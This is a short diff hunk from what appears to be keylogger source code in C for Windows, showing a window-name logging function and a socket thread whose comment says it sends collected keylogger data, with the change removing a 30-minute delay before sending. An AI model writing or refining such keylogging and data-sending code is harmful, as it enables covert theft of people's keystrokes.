@@ -115,7 +115,7 @@ void *SpoofActiveWindow(void *threadID) //FUNCTION FOR WINDOW NAME LOGGING
 
 void *Socket(void *threadID)
 {
-    Sleep(1800000); //Delay so keylogger has data to send
+    //Sleep(1800000); //Delay so keylogger has data to send
     WSADATA wsaData;
     SOCKET sendingSocket;
     SOCKADDR_IN ServerAddr;
